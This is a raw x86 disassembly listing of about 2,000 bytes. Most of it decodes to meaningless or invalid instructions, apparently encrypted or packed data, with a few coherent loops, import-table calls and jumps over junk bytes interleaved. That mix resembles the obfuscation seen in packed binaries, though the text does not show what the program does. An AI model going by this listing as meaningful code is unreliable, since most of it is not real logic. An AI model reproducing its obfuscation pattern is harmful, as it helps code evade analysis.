  404a8b:	lods   eax,DWORD PTR ds:[esi]
  404a8c:	loope  0x404ac5
  404a8e:	jo     0x404ad7
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	pop    ebx
  404a98:	cli    
  404a99:	inc    esi
  404a9a:	test   al,0x95
  404a9c:	push   esi
  404a9d:	sbb    DWORD PTR [ecx+0x5b],ebp
  404aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aa1:	ror    al,0xa1
  404aa4:	call   0xb0158b0a
  404aa9:	aas    
  404aaa:	xor    esp,esp
  404aac:	cmp    edi,DWORD PTR [ebx+ebx*4]
  404aaf:	nop
  404ab0:	xchg   ebp,eax
  404ab1:	gs xchg ebx,eax
  404ab3:	ins    BYTE PTR es:[edi],dx
  404ab4:	stos   BYTE PTR es:[edi],al
  404ab5:	pusha  
  404ab6:	aam    0x94
  404ab8:	lock cmp BYTE PTR [edi-0x7240e801],0x48
  404ac0:	stc    
  404ac1:	cs inc edi
  404ac3:	(bad)  
  404ac4:	xor    al,0x89
  404ac6:	sbb    al,0x50
  404ac8:	inc    edx
  404ac9:	adc    BYTE PTR [edi-0x61],ah
  404acc:	dec    ebp
  404acd:	test   BYTE PTR [esi+0x4e],ah
  404ad0:	mov    edx,0x44b190cb
  404ad5:	mov    eax,ds:0xfef9bff0
  404ada:	les    ecx,FWORD PTR [eax-0x14]
  404add:	push   ss
  404ade:	aam    0x14
  404ae0:	dec    ebx
  404ae1:	pop    edi
  404ae2:	(bad)  
  404ae3:	sbb    al,0xf6
  404ae5:	ficom  WORD PTR [esi+0x2cee1120]
  404aeb:	xor    al,0xb3
  404aed:	ss jno 0x404a70
  404af0:	fstp   DWORD PTR [edx+0x9]
  404af3:	ins    BYTE PTR es:[edi],dx
  404af4:	jo     0x404af9
  404af6:	retf   
  404af7:	scas   al,BYTE PTR es:[edi]
  404af8:	nop
  404af9:	repz mov ds,ebx
  404afc:	mov    eax,0xcf76f7d5
  404b01:	dec    ebx
  404b02:	call   0x3fcced97
  404b07:	mov    edx,DWORD PTR [ebx+0x64bc3ce1]
  404b0d:	mov    ds:0x476d9746,eax
  404b12:	icebp  
  404b13:	pop    es
  404b14:	pop    es
  404b15:	jno    0x404b95
  404b17:	leave  
  404b18:	add    BYTE PTR ds:0x3b654969,al
  404b1e:	jl     0x404b99
  404b20:	or     BYTE PTR [esp+ebx*8-0x78],0xe6
  404b25:	mov    dl,0x74
  404b27:	fcom   QWORD PTR [eax-0x7daa25aa]
  404b2d:	mov    eax,ds:0xc73e045e
  404b32:	mov    eax,es:0x226cbafb
  404b38:	fs pop ebp
  404b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b3b:	pop    es
  404b3c:	shl    dl,1
  404b3e:	push   esi
  404b3f:	les    edx,FWORD PTR [eax+ecx*8+0x65]
  404b43:	sti    
  404b44:	add    edx,DWORD PTR [esp+ebp*4-0x7]
  404b48:	pmulhuw mm4,QWORD PTR [ecx+esi*8+0x6072a3ac]
  404b50:	inc    esp
  404b51:	(bad)  
  404b52:	retf   0xd138
  404b55:	aad    0x11
  404b57:	outs   dx,DWORD PTR ds:[esi]
  404b58:	test   BYTE PTR [esi+eiz*4],bl
  404b5b:	xchg   DWORD PTR [edi+0x34b3e6b7],edi
  404b61:	pop    edx
  404b62:	neg    BYTE PTR ds:0xdd7c3c8a
  404b68:	mov    WORD PTR [eax],gs
  404b6a:	mov    al,ds:0x334d22b9
  404b6f:	mov    ds:0xe962011d,al
  404b74:	and    BYTE PTR [esi-0x62d91be9],bl
  404b7a:	fidiv  WORD PTR [edi+esi*1]
  404b7d:	sbb    BYTE PTR [edx-0x26f4d2fd],ah
  404b83:	nop
  404b84:	xor    dl,bl
  404b86:	div    bl
  404b88:	enter  0xc60c,0x7b
  404b8c:	sbb    al,BYTE PTR [ebx+0x66b654b1]
  404b92:	xchg   ebp,eax
  404b93:	pushf  
  404b94:	test   BYTE PTR [ebx-0x58f34669],al
  404b9a:	xlat   BYTE PTR ds:[ebx]
  404b9b:	dec    ebp
  404b9c:	adc    DWORD PTR [edi],ebx
  404b9e:	stos   DWORD PTR es:[edi],eax
  404b9f:	pop    edi
  404ba0:	xchg   edi,eax
  404ba1:	push   esp
  404ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ba3:	popa   
  404ba4:	xchg   edx,eax
  404ba5:	ds stos BYTE PTR es:[edi],al
  404ba7:	xchg   ebx,eax
  404ba8:	das    
  404ba9:	mov    DWORD PTR ds:[edi+0x64fc320],0x62b446e2
  404bb4:	(bad)  
  404bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb6:	pop    eax
  404bb7:	xor    BYTE PTR [ecx+0xbd276fe],al
  404bbd:	into   
  404bbe:	(bad)  
  404bbf:	add    al,0x5f
  404bc1:	xor    eax,0xee5b6b06
  404bc6:	mov    bl,BYTE PTR [edx-0x23c56123]
  404bcc:	sahf   
  404bcd:	push   ds
  404bce:	in     al,0x57
  404bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd1:	ret    
  404bd2:	mov    esp,fs
  404bd4:	dec    eax
  404bd5:	xchg   ebp,eax
  404bd6:	fist   WORD PTR [ebx]
  404bd8:	mov    esi,0xfc931a05
  404bdd:	out    dx,al
  404bde:	cmc    
  404bdf:	test   BYTE PTR [ebx+0x6d52d43f],bh
  404be5:	and    DWORD PTR [ebx+edi*8-0x52],esp
  404be9:	hlt    
  404bea:	stos   DWORD PTR es:[edi],eax
  404beb:	out    0x35,eax
  404bed:	dec    edi
  404bee:	scas   al,BYTE PTR es:[edi]
  404bef:	cmp    eax,0xaebb8a00
  404bf4:	add    ch,BYTE PTR [edx+0x306292e]
  404bfa:	data16 sub BYTE PTR ds:0x272cc994,al
  404c01:	jecxz  0x404c26
  404c03:	gs dec ebp
  404c05:	test   DWORD PTR [esi-0x22df8ee],esp
  404c0b:	stos   BYTE PTR es:[edi],al
  404c0c:	mov    al,ds:0xd9f94ae4
  404c11:	scas   eax,DWORD PTR es:[edi]
  404c12:	enter  0x124,0xc7
  404c16:	out    0x9f,eax
  404c18:	sbb    bl,BYTE PTR [ecx-0x6d]
  404c1b:	aam    0xb1
  404c1d:	hlt    
  404c1e:	adc    BYTE PTR [ebp-0x4c],ch
  404c21:	mov    esi,0x725a00f2
  404c26:	in     al,dx
  404c27:	js     0x404c0b
  404c29:	xor    ch,BYTE PTR [ecx+0x11]
  404c2c:	jmp    0x404bbd
  404c2e:	sbb    edx,DWORD PTR [eax+0xcfe61dd]
  404c34:	repz sti 
  404c36:	(bad)  
  404c37:	lods   eax,DWORD PTR ds:[esi]
  404c38:	mov    ch,0x90
  404c3a:	js     0x404c7c
  404c3c:	push   esi
  404c3d:	jg     0x404bd5
  404c3f:	pop    ss
  404c40:	in     al,dx
  404c41:	test   BYTE PTR [eax],ah
  404c43:	ds adc esi,edx
  404c46:	jmp    0xbc41:0xa465baf6
  404c4d:	jno    0x404c39
  404c4f:	dec    ebx
  404c50:	jmp    0x404c72
  404c52:	dec    edx
  404c53:	lds    ecx,FWORD PTR [esi+edi*8+0x225fbefe]
  404c5a:	inc    ebp
  404c5b:	pusha  
  404c5c:	push   edx
  404c5d:	int    0x8e
  404c5f:	and    edx,DWORD PTR [eax]
  404c61:	pop    ecx
  404c62:	fstp   DWORD PTR [eax+0x6e]
  404c65:	push   0xffffffed
  404c67:	mov    bl,0x13
  404c69:	inc    esi
  404c6a:	jb     0x404cbc
  404c6c:	jo     0x404c1c
  404c6e:	push   esi
  404c6f:	cmc    
  404c70:	dec    edi
  404c71:	mov    ch,0x88
  404c73:	enter  0x7598,0x7c
  404c77:	mov    ebx,0x934b70f5
  404c7c:	push   esp
  404c7d:	push   ss
  404c7e:	inc    ecx
  404c7f:	mov    bl,0x2c
  404c81:	inc    esp
  404c82:	ds adc al,0x81
  404c85:	dec    edi
  404c86:	ins    BYTE PTR es:[edi],dx
  404c87:	loopne 0x404c83
  404c89:	pushf  
  404c8a:	add    eax,0x2f79520f
  404c8f:	cmp    al,0x51
  404c91:	xchg   esi,eax
  404c92:	sub    eax,DWORD PTR [edi]
  404c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c95:	sbb    ebx,DWORD PTR [ecx+0x19f40865]
  404c9b:	cmp    esi,DWORD PTR [ecx]
  404c9d:	mov    ebp,0xf60ccd05
  404ca2:	adc    DWORD PTR [eax-0x1],0x1c
  404ca6:	mov    edi,0x68f3a064
  404cab:	add    BYTE PTR ds:0x9e9cb05d,bh
  404cb1:	push   0x787439c0
  404cb6:	sar    BYTE PTR [edx],cl
  404cb8:	and    BYTE PTR [ebp-0x35666d76],bl
  404cbe:	stc    
  404cbf:	pop    ecx
  404cc0:	sub    eax,0x85b058ff
  404cc5:	and    DWORD PTR [edi+0x1268814a],ecx
  404ccb:	shl    bh,1
  404ccd:	outs   dx,DWORD PTR ds:[esi]
  404cce:	xchg   esp,eax
  404ccf:	test   BYTE PTR [edi-0x10],al
  404cd2:	es call 0x65603ecf
  404cd8:	cdq    
  404cd9:	add    al,0x3f
  404cdb:	cmp    ebp,DWORD PTR [eax]
  404cdd:	imul   ebp,DWORD PTR [ebp+0x30],0x67bb543a
  404ce4:	xchg   edx,eax
  404ce5:	test   DWORD PTR [ebx],0x3b5144b6
  404ceb:	or     cl,cl
  404ced:	and    bh,al
  404cef:	sbb    BYTE PTR [ebx],al
  404cf1:	cli    
  404cf2:	xchg   DWORD PTR [esi-0x2df9f725],ecx
  404cf8:	pushf  
  404cf9:	mov    bl,0x6b
  404cfb:	or     eax,0x2655caa3
  404d00:	add    bh,BYTE PTR es:[esi]
  404d03:	or     al,0x5e
  404d05:	ins    BYTE PTR es:[edi],dx
  404d06:	leave  
  404d07:	or     dl,BYTE PTR [ebx]
  404d09:	push   cs
  404d0a:	fisttp QWORD PTR [edx]
  404d0c:	or     esi,esi
  404d0e:	xor    BYTE PTR [edx-0x57],ah
  404d11:	or     eax,0x20192fb4
  404d16:	sub    eax,0xeef9f20b
  404d1b:	jns    0x404d94
  404d1d:	cli    
  404d1e:	mov    ds:0xd039b589,eax
  404d23:	or     eax,0x62261988
  404d28:	mov    ah,0x7a
  404d2a:	aaa    
  404d2b:	mov    BYTE PTR gs:[ecx+0x58691d0],bh
  404d32:	xchg   ebp,eax
  404d33:	test   al,0x80
  404d35:	jo     0x404d2e
  404d37:	icebp  
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x8970f630
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d03
  404d6a:	sub    al,0x48
  404d6c:	or     edi,DWORD PTR [ebp+0xe43bcf3]
  404d72:	xor    ecx,0x0
  404d75:	jnp    0x404d7b
  404d77:	test   eax,0xee6f0aff
  404d7c:	call   0xb90f2b1d
  404d81:	or     BYTE PTR [esi],0xcf
  404d84:	lods   eax,DWORD PTR ds:[esi]
  404d85:	and    DWORD PTR [edx-0x59],edx
  404d88:	jno    0x404dc3
  404d8a:	push   esp
  404d8b:	gs pop ds
  404d8d:	out    0x58,al
  404d8f:	jp     0x404df6
  404d91:	ss popa 
  404d93:	in     eax,dx
  404d94:	div    BYTE PTR [esp+ebp*4-0x45]
  404d98:	stos   DWORD PTR es:[edi],eax
  404d99:	add    BYTE PTR [edi],al
  404d9b:	std    
  404d9c:	int    0x15
  404d9e:	jmp    0x404dd6
  404da0:	dec    esp
  404da1:	jbe    0x404deb
  404da3:	jae    0x404d4f
  404da5:	jne    0x404d89
  404da7:	out    dx,eax
  404da8:	(bad)  
  404daa:	cmp    DWORD PTR [edx],0xda04b866
  404db0:	idiv   BYTE PTR [edi+0x7712cf49]
  404db6:	test   DWORD PTR [eax-0x11],esp
  404db9:	and    eax,0xfce03656
  404dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dbf:	ins    DWORD PTR es:[edi],dx
  404dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc1:	je     0x404d4b
  404dc3:	into   
  404dc4:	or     eax,esi
  404dc6:	jnp    0x404e0d
  404dc8:	mov    dl,0xe8
  404dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dcb:	retf   
  404dcc:	scas   al,BYTE PTR es:[edi]
  404dcd:	fiadd  WORD PTR [eax-0x340bbe04]
  404dd3:	retf   0x786e
  404dd6:	push   ecx
  404dd7:	xchg   ebp,eax
  404dd8:	adc    BYTE PTR [edi],0x6a
  404ddb:	sbb    ebp,DWORD PTR [edx-0x47]
  404dde:	pop    ebp
  404ddf:	push   esp
  404de0:	jnp    0x404dfe
  404de2:	ret    0xd786
  404de5:	ss xchg edi,eax
  404de7:	mov    DWORD PTR [esi+0x28],ebp
  404dea:	mov    ecx,esp
  404dec:	sahf   
  404ded:	ins    DWORD PTR es:[edi],dx
  404dee:	or     al,0x7a
  404df0:	loope  0x404d7c
  404df2:	mov    WORD PTR [ebx-0x36fa969e],cs
  404df8:	loope  0x404dc4
  404dfa:	das    
  404dfb:	and    cl,bl
  404dfd:	jne    0x404d89
  404dff:	pushf  
  404e00:	xlat   BYTE PTR ds:[ebx]
  404e01:	cmp    al,0x9c
  404e03:	sbb    ah,BYTE PTR [eax+0x58]
  404e06:	cmp    ebp,edi
  404e08:	mov    edx,0xd2b66a5a
  404e0d:	xchg   esp,eax
  404e0e:	inc    ebp
  404e0f:	sbb    edx,DWORD PTR [ebx]
  404e11:	add    esp,DWORD PTR [edi+0x5e286338]
  404e17:	stos   BYTE PTR es:[edi],al
  404e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e19:	mov    ah,0x38
  404e1b:	sub    eax,0x5f93c463
  404e20:	clc    
  404e21:	xchg   DWORD PTR [ebx],esp
  404e23:	and    eax,0xdd087bff
  404e28:	push   edi
  404e29:	pop    ebx
  404e2a:	jbe    0x404e15
  404e2c:	sbb    eax,edx
  404e2e:	(bad)  [ebx+eiz*4]
  404e32:	sbb    dh,BYTE PTR [eax-0x19579e58]
  404e38:	into   
  404e39:	cmp    al,0x45
  404e3b:	ror    BYTE PTR [eax],1
  404e3d:	sar    DWORD PTR [ebx-0x423c431c],1
  404e43:	xor    DWORD PTR [ecx-0x18],ebp
  404e46:	mov    al,ds:0x65ba4064
  404e4b:	dec    ebp
  404e4c:	mov    ebx,0xd1a2ca34
  404e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e52:	int3   
  404e53:	mov    ebp,0x9f34b471
  404e58:	nop
  404e59:	or     eax,0x4bfebce6
  404e5f:	xchg   ebx,eax
  404e60:	pop    es
  404e61:	mov    eax,0x59da7abe
  404e66:	or     edx,DWORD PTR [edi-0x33f47a73]
  404e6c:	xlat   BYTE PTR fs:[ebx]
  404e6e:	test   DWORD PTR [ecx-0x52],0x72f09f84
  404e75:	cmp    DWORD PTR [eax-0x3577d1b6],ebp
  404e7b:	push   edx
  404e7c:	mov    esp,0xeca15a0e
  404e81:	xor    dh,BYTE PTR [esi+edi*4]
  404e84:	cmp    DWORD PTR [esi],ecx
  404e86:	adc    eax,0x762a3e58
  404e8b:	jne    0x404eac
  404e8d:	adc    ch,BYTE PTR [ecx+0x21]
  404e90:	mov    DWORD PTR [edx],0x26f63a7e
  404e96:	out    0x83,eax
  404e98:	in     al,0x15
  404e9a:	lar    esi,WORD PTR [esi+0x7d]
  404e9e:	inc    eax
  404e9f:	jbe    0x404ea1
  404ea1:	scas   eax,DWORD PTR es:[edi]
  404ea2:	ret    
  404ea3:	mov    DWORD PTR [ecx+edx*1+0x76215a50],esi
  404eaa:	jmp    0x404e4e
  404eac:	push   ecx
  404ead:	dec    esi
  404eae:	outs   dx,DWORD PTR ds:[esi]
  404eaf:	sub    al,0x8
  404eb1:	and    eax,0x8a46021
  404eb6:	aaa    
  404eb7:	adc    al,0xb0
  404eb9:	ins    BYTE PTR es:[edi],dx
  404eba:	dec    ebx
  404ebb:	xchg   ecx,eax
  404ebc:	fldenv [ecx+0x5e]
  404ebf:	adc    eax,0x7a4a1a11
  404ec4:	jmp    0x6cafecb4
  404ec9:	adc    eax,0x9b9c205b
  404ece:	loopne 0x404ede
  404ed0:	sbb    al,0x39
  404ed2:	pusha  
  404ed3:	jmp    0x2f31849f
  404ed8:	mov    ds:0x54810cbe,al
  404edd:	mov    eax,ds:0x73a64cd9
  404ee2:	dec    esp
  404ee3:	rcr    ah,1
  404ee5:	and    dh,BYTE PTR [edi+eiz*1]
  404ee8:	dec    eax
  404ee9:	jbe    0x404eea
  404eeb:	pop    ebp
  404eec:	(bad)  
  404eed:	mov    eax,0xe85a3a9b
  404ef2:	lds    ebp,FWORD PTR [esi]
  404ef4:	es scas eax,DWORD PTR es:[edi]
  404ef6:	push   edi
  404ef7:	adc    ch,BYTE PTR [ecx]
  404ef9:	or     DWORD PTR [ebp-0x42],edi
  404efc:	ficomp WORD PTR [edi+0x43]
  404eff:	sbb    DWORD PTR [esp+edx*4],ebp
  404f02:	je     0x404ecd
  404f04:	data16 adc al,0x9b
  404f07:	adc    DWORD PTR [esi+0x273a3f00],0x2c
  404f0e:	rcl    ebx,1
  404f10:	pop    edx
  404f11:	rol    ch,cl
  404f13:	aas    
  404f14:	jo     0x404f54
  404f16:	and    esp,eax
  404f18:	jbe    0x404f48
  404f1a:	test   al,0x2f
  404f1c:	out    0x4f,al
  404f1e:	pushf  
  404f1f:	xor    bh,BYTE PTR [ebp+ecx*4-0x44]
  404f23:	stos   DWORD PTR es:[edi],eax
  404f24:	xor    eax,DWORD PTR [ecx]
  404f26:	shl    DWORD PTR [eax+0x4c522d6c],cl
  404f2c:	and    DWORD PTR [bp+si-0x56],ebp
  404f30:	xchg   edx,eax
  404f31:	ins    DWORD PTR es:[edi],dx
  404f32:	xchg   esp,eax
  404f33:	fwait
  404f34:	pop    edi
  404f35:	aaa    
  404f36:	in     al,dx
  404f37:	sbb    BYTE PTR [ebx],bl
  404f39:	pop    es
  404f3a:	fnsetpm(287 only) 
  404f3c:	adc    eax,0x1802d9c3
  404f41:	imul   ebp,DWORD PTR [eax],0xc2e1349
  404f47:	lock jmp 0xa2338399
  404f4d:	mov    dh,0x31
  404f4f:	ficomp WORD PTR [ecx+ecx*4-0xd32a6ad]
  404f56:	imul   ebx,DWORD PTR [esp+ebp*4+0x51],0xffffff81
  404f5b:	and    eax,0x4302d9
  404f60:	add    BYTE PTR [eax],al
  404f62:	add    BYTE PTR [eax],al
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	bound  esp,QWORD PTR [edi+0x45]
  405055:	mov    ss,esi
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x404fea
  40505f:	loopne 0x4050c4
  405061:	push   ecx
  405062:	mov    al,ds:0x4001df7a
  405067:	pop    ecx
  405068:	mov    esp,0x67a62b13
  40506d:	call   0x82614b62
  405072:	inc    esi
  405073:	repnz sub eax,0xbaa56eea
  405079:	mov    dh,0xc2
  40507b:	popa   
  40507c:	fistp  DWORD PTR [esi-0x50ba8d3f]
  405082:	push   cs
  405083:	addr16 pop esp
  405085:	cmp    ah,BYTE PTR [esp]
  405088:	popa   
  405089:	jne    0x4050b1
  40508b:	int3   
  40508c:	inc    eax
  40508d:	jb     0x4050d1
  40508f:	(bad)  
  405090:	mov    esi,0x346fd9dd
  405095:	(bad)
  405098:	cmp    eax,0xf32fb231
  40509d:	dec    ebp
  40509e:	dec    esp
  40509f:	loopne 0x40507d
  4050a1:	cwde   
  4050a2:	push   esi
  4050a3:	jmp    0xd6403cbc
  4050a8:	dec    ebx
  4050a9:	ret    
  4050aa:	mov    dh,ah
  4050ac:	sti    
  4050ad:	enter  0x162b,0x19
  4050b1:	jo     0x40504c
  4050b3:	inc    ebp
  4050b4:	adc    eax,0xa1dfcfdb
  4050b9:	ja     0x405107
  4050bb:	inc    ecx
  4050bc:	adc    DWORD PTR [edi-0x7],0x151ce90a
  4050c3:	aad    0x6
  4050c5:	sub    bh,dh
  4050c7:	int    0x58
  4050c9:	ja     0x4050ce
  4050cb:	div    BYTE PTR [edx-0x2f1a3930]
  4050d1:	in     al,dx
  4050d2:	dec    ecx
  4050d3:	or     eax,0xdf8a90e7
  4050d8:	hlt    
  4050d9:	out    dx,al
  4050da:	cmp    edx,DWORD PTR [eax]
  4050dc:	(bad)  
  4050dd:	cld    
  4050de:	fnsave [edx-0x63]
  4050e1:	sub    edx,edi
  4050e3:	repz aad 0xd5
  4050e6:	cmp    eax,0x8aa31816
  4050eb:	xor    BYTE PTR [edx],cl
  4050ed:	pop    esp
  4050ee:	outs   dx,BYTE PTR ds:[esi]
  4050ef:	or     BYTE PTR [edi-0x27],bh
  4050f2:	adc    al,0xba
  4050f4:	je     0x405126
  4050f6:	ja     0x405110
  4050f8:	push   ss
  4050f9:	(bad)  
  4050fa:	gs nop
  4050fc:	push   edi
  4050fd:	sti    
  4050fe:	mov    ebx,0x1805c0e2
  405103:	sub    dh,BYTE PTR [esi+eiz*4]
  405106:	shl    DWORD PTR [edx],0x38
  405109:	fcmovbe st,st(0)
  40510b:	test   ecx,ebp
  40510d:	dec    esi
  40510e:	mov    eax,ds:0xf0a75abd
  405113:	retf   0x61db
  405116:	cmp    eax,0x6ca5ea94
  40511b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40511c:	enter  0x8cfc,0xf0
  405120:	mov    ebp,ebp
  405122:	adc    al,0x28
  405124:	fsub   QWORD PTR [esi]
  405126:	ret    
  405127:	mov    bl,0x8e
  405129:	pop    eax
  40512a:	leave  
  40512b:	scas   eax,DWORD PTR es:[edi]
  40512c:	sar    BYTE PTR [ebx],0x7
  40512f:	cli    
  405130:	call   0x4ee0:0x87803d47
  405137:	popf   
  405138:	mov    bl,0xd4
  40513a:	mov    bh,0x6a
  40513c:	push   edx
  40513d:	add    esi,ecx
  40513f:	icebp  
  405140:	sbb    ebp,esi
  405142:	mov    al,ds:0x234b635d
  405147:	neg    DWORD PTR [ebx-0x3]
  40514a:	imul   DWORD PTR fs:[esi+ebx*1-0x27]
  40514f:	sbb    ebp,ecx
  405151:	sbb    al,0x21
  405153:	jnp    0x405129
  405155:	adc    ebp,DWORD PTR [edi]
  405157:	out    0x92,al
  405159:	fiadd  WORD PTR [edi+0x79]
  40515c:	push   edi
  40515d:	push   0xffffff97
  40515f:	std    
  405160:	sahf   
  405161:	loopne 0x4051a7
  405163:	inc    ebx
  405164:	sub    al,0x31
  405166:	push   eax
  405167:	cwde   
  405168:	lds    ebp,FWORD PTR [ecx+ecx*1]
  40516b:	jecxz  0x4051ce
  40516d:	cmp    DWORD PTR [ecx+0x48dae989],esp
  405173:	loopne 0x405100
  405175:	dec    ecx
  405176:	into   
  405177:	mov    bl,bl
  405179:	fist   DWORD PTR [ebp-0x519806fd]
  40517f:	push   ds
  405180:	addr16 jp 0x4051d8
  405183:	js     0x40518d
  405185:	mov    ch,0xcc
  405187:	pop    ecx
  405188:	dec    esp
  405189:	jno    0x405137
  40518b:	xchg   esp,eax
  40518c:	and    eax,0x8c009524
  405191:	mov    cl,0x48
  405193:	mov    DWORD PTR [ebp*4-0x5d16f40b],edi
  40519a:	sbb    eax,DWORD PTR [edx]
  40519c:	sub    ecx,DWORD PTR [ebp+0x69]
  40519f:	pop    ebx
  4051a0:	and    al,0x5f
  4051a2:	sbb    BYTE PTR [esi+ebp*1-0x7d],dh
  4051a6:	adc    ch,BYTE PTR [ebx]
  4051a8:	loopne 0x4051b7
  4051aa:	mov    eax,0xbb619573
  4051af:	sqrtps xmm0,XMMWORD PTR [esi+0xacbb057]
  4051b6:	jo     0x4051a5
  4051b8:	inc    di
  4051ba:	scas   eax,DWORD PTR es:[edi]
  4051bb:	sahf   
  4051bc:	xchg   esi,eax
  4051bd:	int    0x67
  4051bf:	in     al,0xfb
  4051c1:	lods   ax,WORD PTR ds:[esi]
  4051c3:	(bad)  
  4051c5:	dec    esi
  4051c6:	lock mov ebp,0x57079a54
  4051cc:	lahf   
  4051cd:	into   
  4051ce:	xchg   DWORD PTR [edx-0x43],ecx
  4051d1:	mov    ah,dh
  4051d3:	mov    edx,0x9b3efdc8
  4051d8:	enter  0x9f2b,0x5
  4051dc:	jecxz  0x4051a5
  4051de:	inc    eax
  4051df:	out    dx,eax
  4051e0:	je     0x4051fa
  4051e2:	adc    dh,dh
  4051e4:	jmp    0x7acf804c
  4051e9:	sub    eax,0xef41bfd1
  4051ee:	sub    dh,BYTE PTR [ecx]
  4051f0:	not    DWORD PTR [edi+0x8]
  4051f3:	add    DWORD PTR [eax-0x6421bcd3],eax
  4051f9:	cmp    eax,0x64f7eade
  4051fe:	fdiv   QWORD PTR [eax]
  405200:	mov    dh,0x1c
  405202:	mov    ch,0x74
  405204:	pop    eax
  405205:	leave  
  405206:	xor    BYTE PTR [eax],0x56
  405209:	in     al,0x6f
  40520b:	mov    ecx,0x49e26512
  405210:	lods   al,BYTE PTR ds:[esi]
  405211:	sahf   
  405212:	jo     0x405217
  405214:	adc    DWORD PTR [ebp+0x1add1492],edi
  40521a:	mov    ch,0x78
  40521c:	scas   al,BYTE PTR es:[edi]
  40521d:	mov    DWORD PTR [ebx],ecx
  40521f:	sub    al,BYTE PTR [edx-0x4533b7e4]
  405225:	cld    
  405226:	sbb    bh,BYTE PTR [edi]
  405228:	out    dx,eax
  405229:	xor    eax,0x15080e98
  40522e:	or     esp,DWORD PTR [edi]
  405230:	jmp    0x4f12:0x5a05d83e
  405237:	xor    al,BYTE PTR [edi-0x7e]
  40523a:	popf   
  40523b:	jl     0x405210
  40523d:	sbb    cl,0xc8
  405240:	mov    dl,0xaf
  405242:	xor    DWORD PTR [eax+0x5fd9ed46],edi
  405248:	fs xchg esp,eax
  40524a:	or     al,0xb2
  40524c:	mov    ds:0x854b9d0,eax
  405251:	push   ecx
  405252:	pop    es
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	call   0x7e2c:0xc6f9389e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x405284
  405289:	mov    ecx,0x83443218
  40528e:	inc    ebx
  40528f:	aaa    
  405290:	out    0xc9,al
  405292:	push   edx
